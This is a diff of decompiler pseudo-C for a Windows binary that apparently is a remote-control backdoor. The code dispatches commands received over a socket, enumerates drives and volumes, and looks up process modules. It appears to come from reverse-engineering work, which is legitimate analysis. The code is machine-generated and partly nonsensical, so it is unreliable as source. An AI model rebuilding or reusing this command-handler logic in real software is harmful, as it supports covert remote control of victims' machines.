-// Address range: 0x402aa7 - 0x402d8e
+// Address range: 0x402aa7 - 0x402c55
 int32_t function_402aa7(void) {
     int32_t v1 = g2; // bp-4
     g2 = &v1;
-    int32_t v2 = g5; // 0x402ab1
     int32_t * moduleHandle = LoadLibraryA("Kernel32.dll"); // 0x402ab7
-    int32_t (*func)() = GetProcAddress(moduleHandle, "GetTickCount"); // 0x402ac5
+    int32_t v2 = (int32_t)moduleHandle; // 0x402ab7
+    g5 = (int32_t)GetProcAddress(moduleHandle, "GetTickCount");
     FreeLibrary(moduleHandle);
-    memcpy(&g31->e0, (int32_t *)g32, (int32_t)g27);
-    int32_t v3 = 0; // esi
-    *(int32_t *)&g28 = *(int32_t *)&g27;
-    g29 = g30;
-    g26 = 0;
-    g23 = NULL;
-    __pseudo_call((int32_t)func);
-    g33 = g30;
-    int32_t v4 = *(int32_t *)(4 * (int32_t)g29 + (int32_t)&g8 - 260); // 0x402b2a
-    __pseudo_branch(v4);
+    int32_t v3 = *(int32_t *)&g33; // 0x402ae07
+    memcpy(&((struct _NETRESOURCEA *)v3)->e0, (int32_t *)g34, (int32_t)g29);
+    g7 = 0;
+    *(int32_t *)&g30 = *(int32_t *)&g29;
+    int32_t v4 = g32; // 0x402afa
+    g31 = g32;
+    g28 = 0;
+    g25 = NULL;
+    g35 = v4;
+    switch (v4) {
+        case 65: {
+            // 0x402b93
+            function_404511();
+            // branch -> 0x402bf7
+            break;
+        }
+        case 66: {
+            // 0x402b31
+            function_403b42();
+            // branch -> 0x402bf7
+            break;
+        }
+        case 67: {
+            // 0x402b63
+            function_403587();
+            // branch -> 0x402bf7
+            break;
+        }
+        case 68: {
+            // 0x402b45
+            function_403966();
+            // branch -> 0x402bf7
+            break;
+        }
+        case 69: {
+            // 0x402bab
+            function_404655();
+            // branch -> 0x402bf7
+            break;
+        }
+        case 70: {
+            // 0x402b59
+            function_4038c8();
+            // branch -> 0x402bf7
+            break;
+        }
+        case 71: {
+            // 0x402b85
+            function_403b07();
+            // branch -> 0x402bf7
+            break;
+        }
+        case 72: {
+            // 0x402b8c
+            function_403ae7();
+            // branch -> 0x402bf7
+            break;
+        }
+        case 73: {
+            // 0x402b6d
+            function_403a21();
+            // branch -> 0x402bf7
+            break;
+        }
+        case 74: {
+            // 0x402b93
+            function_404511();
+            // branch -> 0x402bf7
+            break;
+        }
+        case 75: {
+            // 0x402b4f
+            function_403929();
+            // branch -> 0x402bf7
+            break;
+        }
+        case 77: {
+            // 0x402b7e
+            function_403a58();
+            // branch -> 0x402bf7
+            break;
+        }
+        case 78: {
+            // 0x402b9a
+            function_404524(78);
+            g4 = 78;
+            // branch -> 0x402bf7
+            break;
+        }
+        case 79: {
+            // 0x402ba4
+            function_404629();
+            // branch -> 0x402bf7
+            break;
+        }
+        case 80: {
+            // 0x402b77
+            function_4040c4();
+            // branch -> 0x402bf7
+            break;
+        }
+        case 82: {
+            // 0x402b3b
+            function_403948();
+            // branch -> 0x402bf7
+            break;
+        }
+        case 83: {
+            // 0x402b93
+            function_404511();
+            // branch -> 0x402bf7
+            break;
+        }
+        case 84: {
+            // 0x402bb9
+            function_4051f5();
+            // branch -> 0x402bf7
+            break;
+        }
+        case 85: {
+            // 0x402bcf
+            function_405103();
+            // UNREACHABLE
+        }
+        case 86: {
+            // 0x402bab
+            function_404655();
+            // branch -> 0x402bf7
+            break;
+        }
+        case 87: {
+            // 0x402bc0
+            function_404905();
+            // branch -> 0x402bf7
+            break;
+        }
+        case 88: {
+            // 0x402bc7
+            g71 = 0;
+            // branch -> 0x402bf7
+            break;
+        }
+        case 89: {
+            // 0x402bb2
+            function_404569();
+            // branch -> 0x402bf7
+            break;
+        }
+        case 97: {
+            // 0x402bd6
+            function_4055f3();
+            // branch -> 0x402bf7
+            break;
+        }
+        case 98: {
+            // 0x402bdd
+            function_405676();
+            // branch -> 0x402bf7
+            break;
+        }
+        case 99: {
+            // 0x402be4
+            function_4056ae();
+            // branch -> 0x402bf7
+            break;
+        }
+        case 100: {
+            // 0x402beb
+            function_4056fc();
+            // branch -> 0x402bf7
+            break;
+        }
+        case 101: {
+            // 0x402bf2
+            function_405734();
+            // branch -> 0x402bf7
+            break;
+        }
+        case 102: {
+            // 0x402be4
+            function_4056ae();
+            // branch -> 0x402bf7
+            break;
+        }
+    }
+    int32_t v5 = g7; // 0x402bf7
     g5 = 1;
-    g23 = (char *)1;
+    g25 = (char *)1;
     int32_t result; // 0x402c4f
-    if (g24 != v3) {
+    if (g26 != v5) {
         // 0x402c08
-        g24 = v3;
-        g6 = (int32_t)"&ha_j]?&";
-        int32_t v5 = 90; // bp-260
+        g26 = v5;
+        g7 = (int32_t)"&ha_j]?&";
+        int32_t v6 = 90; // bp-260
         strlen("&ha_j]?&");
         int32_t str = 0; // bp-255
-        strcpy((char *)&str, (char *)g6);
-        int32_t len = strlen((char *)g6); // 0x402c37
-        function_401f45((char *)&v5, len + 5);
+        strcpy((char *)&str, (char *)g7);
+        int32_t len = strlen((char *)g7); // 0x402c37
+        function_401f45((char *)&v6, len + 5);
         result = g5;
         // branch -> 0x402c4f
     } else {
         result = 1;
     }
     // 0x402c4f
-    g5 = (int32_t)(struct _PROCESS_INFORMATION *)0x402b14;
-    g6 = v2;
+    g5 = v2;
+    g7 = v2;
     g2 = v1;
     return result;
 }
 
-// Address range: 0x402d8f - 0x402ecd
+// Address range: 0x402ced - 0x402d26
+int32_t function_402ced(void) {
+    // 0x402ced
+    if (WaitForSingleObject((int32_t *)g24, 0) != 0) {
+        // 0x402d19
+        Sleep(1000);
+        return function_402ced();
+    }
+    // 0x402cff
+    SetEvent((int32_t *)g23);
+    WSACleanup();
+    ExitProcess(1);
+    // UNREACHABLE
+}
+
+// Address range: 0x402d26 - 0x402d8f
+int32_t function_402d26(void) {
+    int32_t * moduleHandle = LoadLibraryA("Kernel32.dll"); // 0x402d2e
+    GetProcAddress(moduleHandle, "GetTickCount");
+    int32_t v1 = FreeLibrary(moduleHandle); // 0x402d45
+    g35 = v1;
+    // branch -> 0x402d55
+    while (true) {
+        // 0x402d55
+        g5 = v1;
+        int32_t v2 = 0; // 0x402d59
+        int32_t v3 = v1; // 0x402d7f
+        int32_t v4 = v2; // 0x402d6b
+        if (v2 >= 0xea61) {
+            int32_t v5 = function_401c03(); // 0x402d62
+            v3 = g5;
+            v4 = v5;
+            // branch -> 0x402d69
+        }
+        // 0x402d69
+        if (v4 - g35 >= 0x1b7741) {
+            // 0x402d78
+            g71 = 0;
+            g35 = v3;
+            // branch -> 0x402d85
+        }
+        // 0x402d85
+        *(int32_t *)(g8 - 4) = 10;
+        Sleep((int32_t)moduleHandle);
+        int32_t * v6;
+        v1 = (int32_t)&v6;
+        // branch -> 0x402d55
+    }
+}
+
+// Address range: 0x402d8f - 0x402ece
 int32_t function_402d8f(void) {
     // 0x402d8f
     g1 = 0x2004;
     function_405a10();
-    g6 = g3;
+    int32_t v1 = 0; // ebx
+    g7 = v1;
     g3 = 0;
+    int32_t dwMilliseconds = 0; // bp-16
     g5 = 0x6832;
-    g52 = 0;
-    char v1 = 0; // bp-8200
-    int32_t v2 = 0; // 0x402db0
+    g54 = 0;
+    char v2; // bp-8200
+    int32_t v3 = &v2; // 0x402e29
+    int32_t v4 = 0; // 0x402db0
     // branch -> 0x402db0
     while (true) {
         // 0x402db0
-        int32_t v3; // 0x402e1b
-        int32_t v4; // 0x402e23
-        int32_t v5; // 0x402eb5
-        if (g30 != (char)v2) {
+        int32_t v5; // 0x402e1b
+        int32_t v6; // 0x402e23
+        int32_t v7; // 0x402eb5
+        char v8; // 0x402e15
+        if (g32 != (char)v4) {
             // 0x402db0
-            v4 = v2;
-            v3 = g6;
+            v6 = v4;
+            v5 = g7;
+            v8 = v2;
             // branch -> 0x402e15
           lab_0x402e15:;
-            int32_t v6 = v3 - 5; // 0x402e1b
-            g6 = v6;
-            g30 = v1;
-            g25 = v4;
+            int32_t v9 = v5 - 5; // 0x402e1b
+            g7 = v9;
+            g32 = v8;
+            g27 = v6;
             // branch -> 0x402e29
+            int32_t v10; // 0x402e90
             while (true) {
-                int32_t v7 = function_402f2f((char *)v6); // 0x402e31
-                g27 = (struct _WIN32_FIND_DATAA *)v7;
-                if (v7 == -1) {
+                // 0x402e29
+                *(int32_t *)(g8 - 4) = v9;
+                *(int32_t *)(g8 - 8) = v3;
+                int32_t v11 = function_402f2f(); // 0x402e31
+                int32_t * v12 = (int32_t *)(g8 + 4); // 0x402e3a
+                g4 = *v12;
+                g29 = (struct _WIN32_FIND_DATAA *)v11;
+                if (v11 == -1) {
                     // 0x402ea7
-                    g30 = g3;
-                    v5 = g3;
+                    g32 = g3;
+                    v7 = g3;
                     // branch -> 0x402ead
                 } else {
                     // 0x402e42
-                    memcpy((int32_t *)g32, (int32_t *)&v1, v7);
-                    int32_t v8 = g6 - (int32_t)g27; // 0x402e55
-                    g6 = v8;
-                    int32_t v9 = g3;
-                    if ((struct _WIN32_FIND_DATAA *)v8 <= (struct _WIN32_FIND_DATAA *)g3) {
+                    *v12 = v11;
+                    *(int32_t *)g8 = v3;
+                    *(int32_t *)(g8 - 4) = g34;
+                    memcpy((int32_t *)dwMilliseconds, (int32_t *)0, v1);
+                    int32_t v13 = g7 - (int32_t)g29; // 0x402e55
+                    g7 = v13;
+                    int32_t v14 = g3; // 0x402e5e
+                    int32_t v15 = v14;
+                    if ((struct _WIN32_FIND_DATAA *)v13 <= (struct _WIN32_FIND_DATAA *)v14) {
                         // 0x402e62
-                        if ((int32_t)g23 == g3) {
-                            Sleep(1);
-                            while ((int32_t)g23 == g3) {
-                                // 0x402e6a
-                                Sleep(1);
-                                // continue -> 0x402e6a
-                            }
-                            // 0x402e82
-                            g54 = 1;
-                            g26 = 1;
-                            // branch -> 0x402e8c
-                          lab_0x402e8c:
-                            while (true) {
-                                // 0x402e8c
-                                Sleep(1);
-                                if (g26 == g3) {
-                                    // break -> 0x402e98
+                        if ((int32_t)g25 == v14) {
+                            // 0x402e6a
+                            *(int32_t *)(g8 + 8) = 1;
+                            Sleep(dwMilliseconds);
+                            if ((int32_t)g25 == g3) {
+                                *(int32_t *)(g8 - 4) = 1;
+                                Sleep(dwMilliseconds);
+                                while ((int32_t)g25 == g3) {
+                                    // 0x402e6a
+                                    *(int32_t *)(g8 - 4) = 1;
+                                    Sleep(dwMilliseconds);
+                                    // continue -> 0x402e6a
+                                }
+                                // 0x402e82
+                                g57 = 1;
+                                g28 = 1;
+                                // branch -> 0x402e8c
+                              lab_0x402e8c:
+                                while (true) {
+                                    // 0x402e8c
+                                    *(int32_t *)(g8 - 4) = 1;
+                                    Sleep(dwMilliseconds);
+                                    v10 = g3;
+                                    if (g28 == v10) {
+                                        // break -> 0x402e98
+                                        break;
+                                    }
+                                    // continue -> 0x402e8c
+                                }
+                                int32_t v16 = g7; // 0x402e98
+                                if ((struct _WIN32_FIND_DATAA *)v16 <= (struct _WIN32_FIND_DATAA *)v10) {
+                                    // break -> 0x402e9c
                                     break;
                                 }
-                                // continue -> 0x402e8c
+                                v9 = v16;
+                                // continue -> 0x402e29
+                                continue;
+                            } else {
+                                v15 = 1;
                             }
-                            int32_t v10 = g6; // 0x402e98
-                            if ((struct _WIN32_FIND_DATAA *)v10 <= (struct _WIN32_FIND_DATAA *)g3) {
-                                // break -> 0x402e9c
-                                break;
-                            }
-                            v6 = v10;
-                            // continue -> 0x402e29
-                            continue;
                         } else {
-                            v9 = 1;
+                            v15 = 1;
                         }
                     }
                     // 0x402e82
-                    g54 = v9;
-                    g26 = 1;
+                    g57 = v15;
+                    g28 = 1;
                     // branch -> 0x402e8c
                     goto lab_0x402e8c;
                 }
                 // 0x402ead
-                if (g52 == v5) {
+                if (g54 == v7) {
                     // 0x402eb5
-                    g66 = (struct _OVERLAPPED *)v5;
+                    g71 = v7;
                     // branch -> 0x402ebb
                 }
                 // 0x402ebb
-                g51 = 1;
+                g53 = 1;
                 return 0;
             }
             // 0x402e9c
-            g30 = g3;
+            g32 = v10;
             // branch -> 0x402db0
           lab_0x402db0_2:
             // 0x402db0
-            v2 = g3;
+            v4 = g3;
             // branch -> 0x402db0
             continue;
         } else {
             // 0x402db8
             if (function_402ece() != 0) {
                 // 0x402dc5
-                if (function_402f2f((char *)5) != -1) {
+                *(int32_t *)(g8 - 4) = 5;
+                *(int32_t *)(g8 - 8) = v3;
+                int32_t v17 = function_402f2f(); // 0x402dce
+                int32_t * v18 = (int32_t *)(g8 + 4); // 0x402dd7
+                g4 = *v18;
+                if (v17 != -1) {
                     // 0x402dde
-                    int32_t v11;
-                    g6 = v11;
-                    if (v11 < 5) {
+                    int32_t v19;
+                    if (v19 < 5) {
                         goto lab_0x402db0_2;
                     }
-                    if (v1 != 90) {
+                    char v20 = v2; // 0x402de9
+                    if (v20 != 90) {
                         // 0x402dfe
-                        if (v1 != 81) {
+                        if (v20 != 81) {
                             // 0x402dfe
-                            v4 = g3;
-                            v3 = v11;
+                            v6 = g3;
+                            v5 = v19;
+                            v8 = v20;
                             // branch -> 0x402e15
                             goto lab_0x402e15;
                         } else {
                             // 0x402e07
-                            SetEvent((int32_t *)g20);
+                            *v18 = g22;
+                            SetEvent((int32_t *)dwMilliseconds);
                             // branch -> 0x402db0
                             goto lab_0x402db0_2;
                         }
                       lab_0x402db0_3:
                         // 0x402db0
-                        v2 = g3;
+                        v4 = g3;
                         // branch -> 0x402db0
                         continue;
                     } else {
                         // 0x402df2
-                        g24 = 1;
+                        g26 = 1;
                         // branch -> 0x402db0
                         goto lab_0x402db0_3;
                     }
                 }
             }
             // 0x402ead
-            v5 = g3;
+            v7 = g3;
             // branch -> 0x402ead
         }
         // 0x402ead
-        if (g52 == v5) {
+        if (g54 == v7) {
             // 0x402eb5
-            g66 = (struct _OVERLAPPED *)v5;
+            g71 = v7;
             // branch -> 0x402ebb
         }
         // 0x402ebb
-        g51 = 1;
+        g53 = 1;
         return 0;
     }
 }
 
-// Address range: 0x402ece - 0x402f2e
+// Address range: 0x402ece - 0x402f2f
 int32_t function_402ece(void) {
+    int32_t flags = g2; // bp-4
+    int32_t sock = g7; // bp-16
     int32_t v1 = 0; // ebx
+    int32_t v2 = &sock; // 0x402edc
     // branch -> 0x402edc
     while (true) {
-        char buf = 0; // bp-5
-        uint32_t v2 = recv(*(int32_t *)&g34, &buf, 1, 0); // 0x402eea
-        if (v2 == -1) {
+        // 0x402edc
+        *(int32_t *)(v2 - 4) = 0;
+        *(int32_t *)(v2 - 8) = 1;
+        char v3; // bp-5
+        *(int32_t *)(v2 - 12) = (int32_t)&v3;
+        *(int32_t *)(v2 - 16) = (int32_t)g36;
+        uint32_t v4 = recv(sock, (char *)g3, g4, flags); // 0x402eea
+        int32_t v5; // 0x402f2b
+        if (v4 == -1) {
             // 0x402ef5
             if (WSAGetLastError() == 0x2733) {
                 goto lab_0x402f02_2;
             }
             // 0x402f24
+            v5 = g8;
             // branch -> 0x402f2b
             // 0x402f2b
+            g7 = *(int32_t *)v5;
+            g3 = *(int32_t *)(v5 + 4);
+            g2 = flags;
             return 0;
         }
         // 0x402f08
-        if (v2 >= 1) {
-            if (buf != 13) {
+        if (v4 >= 1) {
+            if (v3 != 13) {
                 // 0x402f12
-                if (buf != 10) {
+                if (v3 != 10) {
                     // 0x402f18
                     v1 = 0;
                     // branch -> 0x402f02
                   lab_0x402f02:
                     // 0x402f02
-                    Sleep(1);
+                    *(int32_t *)(g8 - 4) = 1;
+                    Sleep(sock);
+                    v2 = g8;
                     // branch -> 0x402edc
                     continue;
                 }
             }
-            int32_t v3 = v1 + 1; // 0x402f1c
-            v1 = v3;
-            if (v3 < 4) {
+            int32_t v6 = v1 + 1; // 0x402f1c
+            v1 = v6;
+            if (v6 < 4) {
                 goto lab_0x402f02;
             }
             // 0x402f28
+            *(int32_t *)(g8 - 4) = 1;
+            v5 = g8;
             // branch -> 0x402f2b
             // 0x402f2b
+            g7 = *(int32_t *)v5;
+            g3 = *(int32_t *)(v5 + 4);
+            g2 = flags;
             return 1;
         }
       lab_0x402f02_2:
         // 0x402f02
-        Sleep(1);
+        *(int32_t *)(g8 - 4) = 1;
+        Sleep(sock);
+        v2 = g8;
         // branch -> 0x402edc
     }
 }
 
-// Address range: 0x402f2f - 0x402f9a
-int32_t function_402f2f(char * a1) {
-    int32_t v1 = g5; // 0x402f31
-    int32_t result;
-    int32_t result2 = result; // edi
+// Address range: 0x402f2f - 0x402f9b
+int32_t function_402f2f(void) {
+    char * buf = (char *)g7; // 0x402f30
+    int32_t sock = g5; // bp-12
+    int32_t v1 = &sock; // 0x402f31
     int32_t v2 = 0; // esi
     int32_t v3 = 0; // ebx
-    int32_t v4; // 0x402f4522
+    int32_t result2; // edi
+    int32_t result;
+    int32_t v4; // 0x402f49
+    int32_t v5; // 0x402f4b
+    int32_t v6; // 0x402f92
     if (result > 0x2000) {
         // 0x402f45
         result2 = 0x2000;
+        v5 = v1;
         v4 = 0x2000;
         // branch -> 0x402f49
     } else {
         // 0x402f45
         if (result < 1) {
             // 0x402f92
-            g5 = v1;
+            v6 = g8;
+            g5 = *(int32_t *)v6;
+            g7 = *(int32_t *)(v6 + 4);
+            g3 = *(int32_t *)(v6 + 8);
             return result;
         }
+        v5 = v1;
         v4 = result;
     }
-    int32_t v5 = 0; // 0x402f54
-    int32_t v6 = v4; // 0x402f49
-    // branch -> 0x402f49
     while (true) {
-        int32_t sock = *(int32_t *)&g34; // 0x402f572
-        int32_t v7 = recv(sock, (char *)(v5 + (int32_t)a1), v6 - v5, 0); // 0x402f5d
-        if (v7 < 1) {
-            // 0x402f67
-            if (WSAGetLastError() != 0x2733) {
-                // 0x402f96
-                // branch -> 0x402f92
-                // 0x402f92
-                g5 = v1;
-                return -1;
+        // 0x402f49
+        *(int32_t *)(v5 - 4) = 0;
+        *(int32_t *)(v5 - 8) = v4 - v2;
+        *(int32_t *)(v5 - 12) = v2 + *(int32_t *)(v5 + 16);
+        *(int32_t *)(v5 - 16) = (int32_t)g36;
+        int32_t * flags;
+        int32_t v7 = recv(sock, buf, g3, (int32_t)&flags); // 0x402f5d
+        if (v7 >= 0 == (v7 != 0)) {
+            // 0x402f80
+            v2 += v7;
+            v3 = 0;
+            // branch -> 0x402f84
+          lab_0x402f84:
+            // 0x402f84
+            *(int32_t *)(g8 - 4) = 1;
+            Sleep(sock);
+            if (v2 < result2) {
+                // 0x402f84
+                v5 = g8;
+                v4 = result2;
+                // branch -> 0x402f49
+                continue;
             }
-            int32_t v8 = v3; // 0x402f74
-            v3 = v8 + 1;
-            int32_t v9 = v8 - 0x1770; // 0x402f77
-            if (v9 == 0 || v9 < 0 != (0x176f - v8 & v8) < 0) {
-                goto lab_0x402f84;
-            }
+            // 0x402f92
+            v6 = g8;
+            g5 = *(int32_t *)v6;
+            g7 = *(int32_t *)(v6 + 4);
+            g3 = *(int32_t *)(v6 + 8);
+            return result2;
+        }
+        // 0x402f67
+        if (WSAGetLastError() != 0x2733) {
             // 0x402f96
             // branch -> 0x402f92
             // 0x402f92
-            g5 = v1;
+            v6 = g8;
+            g5 = *(int32_t *)v6;
+            g7 = *(int32_t *)(v6 + 4);
+            g3 = *(int32_t *)(v6 + 8);
             return -1;
         }
-        // 0x402f80
-        v2 += v7;
-        v3 = 0;
-        // branch -> 0x402f84
-      lab_0x402f84:
-        // 0x402f84
-        Sleep(1);
-        if (v2 >= result2) {
-            // break -> 0x402f92
-            break;
+        int32_t v8 = v3; // 0x402f74
+        v3 = v8 + 1;
+        if (v8 <= 0x1770) {
+            goto lab_0x402f84;
         }
-        v5 = v2;
-        v6 = result2;
-        // continue -> 0x402f49
+        // 0x402f96
+        // branch -> 0x402f92
+        // 0x402f92
+        v6 = g8;
+        g5 = *(int32_t *)v6;
+        g7 = *(int32_t *)(v6 + 4);
+        g3 = *(int32_t *)(v6 + 8);
+        return -1;
     }
-    // 0x402f92
-    g5 = v1;
-    return result2;
 }
 
-// Address range: 0x402f9b - 0x4030c6
+// Address range: 0x402f9b - 0x4030c7
 int32_t function_402f9b(void) {
-    // 0x402f9b
-    int32_t lpBuffer; // bp-1164
-    int32_t str2 = &lpBuffer; // 0x402f9e
-    int32_t v1 = g6; // 0x402fa8
-    int32_t str = 0; // bp-647
-    int32_t v2 = 65; // bp-652
-    strcpy((char *)&str, (char *)&g64);
-    int32_t len = strlen((char *)&g64); // 0x402fc3
-    *(int32_t *)(len - 642 + g2) = (int32_t)g36;
-    g6 = 10 + len;
+    int32_t nVolumeNameSize = g2; // bp-4
+    g2 = &nVolumeNameSize;
+    char lpBuffer; // bp-1164
+    int32_t v1 = &lpBuffer; // 0x402f9e
+    char v2 = 65; // bp-652
+    int32_t str; // bp-647
+    strcpy((char *)&str, (char *)&g68);
+    int32_t len = strlen((char *)(int32_t)&g68); // 0x402fc3
+    *(int32_t *)(len - 642 + g2) = g38;
+    g7 = 10 + len;
+    int32_t v3; // 0x4030c2
+    int32_t v4; // 0x4030b5
     int32_t result; // 0x4030bd
-    if (GetLogicalDriveStringsA(512, (char *)&lpBuffer) == 0 || (char)lpBuffer == 0) {
+    if (GetLogicalDriveStringsA(512, &lpBuffer) == 0 || lpBuffer == 0) {
         // 0x4030af
-        result = function_401f45((char *)&v2, g6);
-        g6 = v1;
+        v4 = g8;
+        *(int32_t *)(v4 - 4) = g7;
+        *(int32_t *)(v4 - 8) = (int32_t)&v2;
+        result = function_401f45((char *)g7, str);
+        v3 = g8;
+        g4 = *(int32_t *)(v3 + 4);
+        g7 = *(int32_t *)(v3 + 8);
         return result;
     }
-    int32_t v3 = 0;
+    char * str2 = (char *)g5; // bp-1184
+    char * str3; // bp-140
+    int32_t v5 = (int32_t)&str3; // 0x40305e
+    int32_t v6 = (int32_t)&str2; // 0x40300e
+    char * lpVolumeNameBuffer = NULL;
     // branch -> 0x40300e
     while (true) {
-        int32_t v4 = strlen((char *)str2) + 1; // 0x40301f
-        int32_t v5 = v4; // ebx
-        strcpy((char *)(g2 - 648 + g6), (char *)str2);
-        int32_t v6 = v4 + g6; // esi
-        int32_t driveType = GetDriveTypeA((char *)str2); // 0x40302b
-        char lpVolumeNameBuffer; // bp-140
-        int32_t len2; // 0x403079
-        int32_t v7; // 0x403081
-        int32_t v8; // 0x403098
-        int32_t v9; // 0x40307e
+        // 0x40300e
+        *(int32_t *)(v6 - 4) = v1;
+        int32_t len2 = strlen(str2); // ebx
+        *(int32_t *)(g8 - 4) = v1;
+        *(int32_t *)(g8 - 8) = g2 - 648 + g7;
+        len2++;
+        strcpy(str2, (char *)g3);
+        int32_t v7 = len2 + g7; // esi
+        *(int32_t *)(g8 + 8) = v1;
+        int32_t driveType = GetDriveTypeA(str2); // 0x40302b
+        int32_t v8; // 0x4030ad
+        int32_t v9; // 0x403064
+        int32_t len3; // 0x403079
+        int32_t v10; // 0x403081
+        int32_t v11; // 0x403098
+        int32_t v12; // 0x40307e
+        int32_t * lpMaximumComponentLength;
         if (driveType == 2) {
           lab_0x403057:
             // 0x403057
-            lpVolumeNameBuffer = 0;
+            str3 = NULL;
             // branch -> 0x40305e
         } else {
-            // 0x403039
-            if (!GetVolumeInformationA((char *)str2, &lpVolumeNameBuffer, 128, NULL, NULL, NULL, NULL, 0)) {
+            int32_t v13 = 0; // eax
+            *(int32_t *)(g8 - 4) = 0;
+            *(int32_t *)(g8 - 8) = v13;
+            *(int32_t *)(g8 - 12) = v13;
+            *(int32_t *)(g8 - 16) = v13;
+            *(int32_t *)(g8 - 20) = v13;
+            *(int32_t *)(g8 - 24) = 128;
+            *(int32_t *)(g8 - 28) = v5;
+            *(int32_t *)(g8 - 32) = v1;
+            bool v14 = GetVolumeInformationA((char *)driveType, lpVolumeNameBuffer, nVolumeNameSize, (int32_t *)0, &lpMaximumComponentLength, &lpMaximumComponentLength, (char *)&lpMaximumComponentLength, (int32_t)&lpMaximumComponentLength); // 0x40304d
+            if (!v14) {
                 goto lab_0x403057;
             }
             // 0x40305e
-            strcpy((char *)(g2 - 648 + v6), &lpVolumeNameBuffer);
-            len2 = strlen(&lpVolumeNameBuffer);
-            v9 = v5 + v3;
-            v7 = len2 + 1 + v6;
-            *(int32_t *)(v7 - 648 + g2) = driveType;
-            g6 = v7 + 4;
-            v8 = v9 - 1160 + g2;
-            if (*(char *)v8 == 0) {
-                // break -> 0x4030ad
-                break;
+            v9 = g8;
+            *(int32_t *)(v9 - 4) = v5;
+            *(int32_t *)(v9 - 8) = g2 - 648 + v7;
+            strcpy(str3, (char *)&lpMaximumComponentLength);
+            *(int32_t *)(g8 - 4) = v5;
+            len3 = strlen(str3);
+            v12 = len2 + (int32_t)lpVolumeNameBuffer;
+            v10 = len3 + 1 + v7;
+            *(int32_t *)(v10 - 648 + g2) = driveType;
+            g7 = v10 + 4;
+            v11 = v12 - 1160 + g2;
+            if (*(char *)v11 == 0) {
+                // 0x4030ad
+                v8 = g8;
+                g5 = *(int32_t *)v8;
+                g3 = *(int32_t *)(v8 + 4);
+                // branch -> 0x4030af
+                // 0x4030af
+                v4 = g8;
+                *(int32_t *)(v4 - 4) = g7;
+                *(int32_t *)(v4 - 8) = (int32_t)&v2;
+                result = function_401f45((char *)g7, str);
+                v3 = g8;
+                g4 = *(int32_t *)(v3 + 4);
+                g7 = *(int32_t *)(v3 + 8);
+                return result;
             }
-            str2 = v8;
-            v3 = v9;
-            // continue -> 0x40300e
+          lab_0x40305e:
+            // 0x40305e
+            v6 = g8;
+            v1 = v11;
+            lpVolumeNameBuffer = (char *)v12;
+            // branch -> 0x40300e
             continue;
         }
         // 0x40305e
-        strcpy((char *)(g2 - 648 + v6), &lpVolumeNameBuffer);
-        len2 = strlen(&lpVolumeNameBuffer);
-        v9 = v5 + v3;
-        v7 = len2 + 1 + v6;
-        *(int32_t *)(v7 - 648 + g2) = driveType;
-        g6 = v7 + 4;
-        v8 = v9 - 1160 + g2;
-        if (*(char *)v8 == 0) {
-            // break -> 0x4030ad
-            break;
+        v9 = g8;
+        *(int32_t *)(v9 - 4) = v5;
+        *(int32_t *)(v9 - 8) = g2 - 648 + v7;
+        strcpy(str3, (char *)&lpMaximumComponentLength);
+        *(int32_t *)(g8 - 4) = v5;
+        len3 = strlen(str3);
+        v12 = len2 + (int32_t)lpVolumeNameBuffer;
+        v10 = len3 + 1 + v7;
+        *(int32_t *)(v10 - 648 + g2) = driveType;
+        g7 = v10 + 4;
+        v11 = v12 - 1160 + g2;
+        if (*(char *)v11 != 0) {
+            goto lab_0x40305e;
         }
-        str2 = v8;
-        v3 = v9;
-        // continue -> 0x40300e
+        // 0x4030ad
+        v8 = g8;
+        g5 = *(int32_t *)v8;
+        g3 = *(int32_t *)(v8 + 4);
+        // branch -> 0x4030af
+        // 0x4030af
+        v4 = g8;
+        *(int32_t *)(v4 - 4) = g7;
+        *(int32_t *)(v4 - 8) = (int32_t)&v2;
+        result = function_401f45((char *)g7, str);
+        v3 = g8;
+        g4 = *(int32_t *)(v3 + 4);
+        g7 = *(int32_t *)(v3 + 8);
+        return result;
     }
-    // 0x4030ad
-    g5 = (int32_t)(char *)g5;
-    // branch -> 0x4030af
-    // 0x4030af
-    result = function_401f45((char *)&v2, g6);
-    g6 = v1;
-    return result;
 }
 
-// Address range: 0x4030c7 - 0x40328c
+// Address range: 0x4030c7 - 0x40328d
 int32_t function_4030c7(void) {
     // 0x4030c7
-    char str2; // bp-1348
-    int32_t v1 = &str2; // 0x4030ca
-    int32_t v2 = g3; // 0x4030d0
+    char * hObject; // bp-1348
+    int32_t v1 = (int32_t)&hObject; // 0x4030ca
     g3 = 0;
-    int32_t v3 = g6; // 0x4030da
-    int32_t v4 = g5; // 0x4030db
-    int32_t v5;
+    int32_t v2 = g5; // bp-1360
+    char * str;
+    char * lpBuffer;
+    int32_t v3; // bp-324
+    int32_t v4; // bp-833
+    int32_t v5; // bp-836
     int32_t v6;
-    int32_t v7; // bp-324
-    int32_t str; // bp-833
-    int32_t lpBuffer; // bp-836
-    int32_t v8;
-    int32_t result; // 0x40328c
-    int32_t * hObject; // 0x403189
+    int32_t v7; // 0x403145
+    int32_t v8; // 0x403156
+    int32_t v9; // 0x403167
+    int32_t v10; // 0x403178
+    int32_t v11; // 0x403183
+    int32_t result2; // 0x40328c
+    int32_t v12; // 0x403137
+    int32_t v13; // 0x4031b0
+    int32_t v14; // 0x40321e
+    int32_t v15; // 0x403131
+    int32_t v16; // 0x4031a0
+    int32_t uSize; // 0x403139
+    int32_t * v17; // 0x40321e
+    int32_t * v18; // 0x403189
     int32_t handleClosed; // 0x403278
-    if (g62 == 2) {
+    int32_t v19; // 0x403189
+    int32_t * str2;
+    if (g66 == 2) {
         int32_t * moduleHandle = LoadLibraryA("psapi.dll"); // 0x4030ec
         int32_t hModule = (int32_t)moduleHandle; // 0x4030ec
         if (hModule == g3) {
             // 0x403288
-            g5 = v4;
-            g6 = v3;
-            g3 = v2;
+            g3 = *(int32_t *)(g8 + 8);
             return hModule;
         }
-        int32_t func = (int32_t)GetProcAddress(moduleHandle, "EnumProcessModules"); // 0x40310b
-        int32_t func2 = (int32_t)GetProcAddress((int32_t *)hModule, "GetModuleFileNameExA"); // 0x403116
-        int32_t v9 = g3; // 0x403118
-        if (func == v9 || func2 == v9) {
+        int32_t (*func)() = GetProcAddress(moduleHandle, "EnumProcessModules"); // 0x40310b
+        int32_t (*func2)() = GetProcAddress((int32_t *)hModule, "GetModuleFileNameExA"); // 0x403116
+        int32_t result = (int32_t)func2; // 0x403116
+        int32_t v20 = g3; // 0x403118
+        if ((int32_t)func == v20 || result == v20) {
             // 0x403288
-            g5 = v4;
-            g6 = v3;
-            g3 = v2;
-            return func2;
+            g3 = *(int32_t *)(g8 + 8);
+            return result;
         }
-        v6 = func2;
-        v5 = func;
